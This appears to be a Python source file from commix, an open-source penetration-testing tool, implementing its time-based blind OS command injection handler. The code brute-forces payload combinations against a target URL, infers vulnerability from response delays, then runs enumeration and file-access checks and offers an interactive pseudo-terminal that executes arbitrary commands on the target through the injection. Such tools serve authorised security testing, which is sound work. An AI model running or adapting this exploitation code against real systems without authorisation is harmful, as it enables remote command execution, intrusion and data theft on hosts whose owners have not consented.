#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import urllib
import urllib2

from src.utils import menu
from src.utils import logs
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.blind_based.techniques.time_based import tb_injector
from src.core.injections.blind_based.techniques.time_based import tb_payloads
from src.core.injections.blind_based.techniques.time_based import tb_enumeration
from src.core.injections.blind_based.techniques.time_based import tb_file_access

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

#-------------------------------------------------
# The "time-based" injection technique handler.
#-------------------------------------------------
def tb_injection_handler(url, delay, filename, http_request_method, url_time_response):
  
  counter = 1
  num_of_chars = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  fixation = False
  export_injection_info = False

  injection_type = "Blind-based Command Injection"
  technique = "time-based injection technique"

  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = menu.options.maxlen
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print Back.RED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + Style.RESET_ALL

  # Calculate all possible combinations
  total = (len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES) - len(settings.JUNK_COMBINATION))
    
  sys.stdout.write("(*) Testing the "+ technique + "... ")
  sys.stdout.flush()

  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:
        num_of_chars = num_of_chars + 1
        
        # Check for bad combination of prefix and separator
        combination = prefix + separator
        if combination in settings.JUNK_COMBINATION:
          prefix = ""
        
        # Define alter shell
        alter_shell = menu.options.alter_shell
        
        # Change TAG on every request to prevent false-positive results.
        TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
        tag_length = len(TAG) + 4
        
        for output_length in range(1, int(tag_length)):
          try:
            
            if alter_shell:
              # Time-based decision payload (check if host is vulnerable).
              payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, delay, http_request_method)
            else:
              # Time-based decision payload (check if host is vulnerable).
              payload = tb_payloads.decision(separator, TAG, output_length, delay, http_request_method)

            # Fix prefixes / suffixes
            payload = parameters.prefixes(payload, prefix)
            payload = parameters.suffixes(payload, suffix)
              
            # Check if defined "--verbose" option.
            if menu.options.verbose:
              sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)

            # Cookie Injection
            if settings.COOKIE_INJECTION == True:
              # Check if target host is vulnerable to cookie injection.
              vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
              how_long = tb_injector.cookie_injection_test(url, vuln_parameter, payload)

            else:
              # Check if target host is vulnerable.
              how_long, vuln_parameter = tb_injector.injection_test(payload, http_request_method, url)

            # Injection percentage calculation
            percent = ((num_of_chars * 100) / total)

            if percent == 100 and no_result == True:
              if not menu.options.verbose:
                percent = Fore.RED + "FAILED" + Style.RESET_ALL
              else:
                percent = ""
            else:
              if (url_time_response <= 1 and how_long >= delay) or \
              (url_time_response >= 2 and how_long > delay):

                # Time relative false positive fixation.
                if len(TAG) == output_length :
                  if fixation == True:
                    delay = delay + 1
                else:
                  fixation = True
                  continue

                randv1 = random.randrange(0, 1)
                randv2 = random.randrange(1, 2)
                randvcalc = randv1 + randv2
                cmd = "(" + str(randv1) + "+" + str(randv2) + ")"
                output = tb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell)
                
                if str(output) == str(randvcalc):
                  if not menu.options.verbose:
                    percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                  else:
                    percent = ""
              else:
                percent = str(percent)+"%"
                
            if not menu.options.verbose:
              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
              sys.stdout.flush()

          except KeyboardInterrupt: 
            raise
        
          except:
            break
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if (url_time_response <= 1 and how_long >= delay) or \
          (url_time_response >= 2 and how_long > delay):

            if len(TAG) == output_length :
              found = True
              no_result = False

              if settings.COOKIE_INJECTION == True: 
                http_request_method = "cookie"
                found_vuln_parameter = vuln_parameter
              else:
                if http_request_method == "GET":
                  found_vuln_parameter = parameters.vuln_GET_param(url)
                else :
                  found_vuln_parameter = vuln_parameter

              # Print the findings to log file.
              if export_injection_info == False:
                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
              if vp_flag == True:
                vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
              logs.upload_payload(filename, counter, payload) 
              counter = counter + 1
              
              # Print the findings to terminal.
              print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
              print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
              print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", urllib.unquote_plus(payload.replace("\n", "\\n"))) + Style.RESET_ALL

              # Check for any enumeration options.
              tb_enumeration.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)

              # Check for any system file access options.
              tb_file_access.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
              
              # Check if defined single cmd.
              if menu.options.os_cmd:
                tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)

              # Pseudo-Terminal shell
              while True:
                gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
                if gotshell in settings.CHOISE_YES:
                  print ""
                  print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
                  while True:
                    try:
                      cmd = raw_input("Shell > ")
                      if cmd == "q":
                        logs.logs_notification(filename)
                        sys.exit(0)
                        
                      else:
                        # The main command injection exploitation.
                        check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)

                      if menu.options.verbose:
                        print ""
                      if output != "" and check_how_long != 0 :
                        print "\n\n" + Fore.GREEN + Style.BRIGHT + output + Style.RESET_ALL
                        print "\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) +".\n"
                      else:
                        print ""
                        
                    except KeyboardInterrupt: 
                      raise
                  
                elif gotshell in settings.CHOISE_NO:
                  break
                  if menu.options.verbose:
                    sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
                    sys.stdout.flush()
                
                else:
                  if gotshell == "":
                    gotshell = "enter"
                  print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
                  pass
            
            break
          
  if no_result == True:
    print ""
    return False

  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

"""
The exploitation function.
(call the injection handler)
"""
def exploitation(url, delay, filename, http_request_method, url_time_response):
  if tb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
    return False
    
#eof
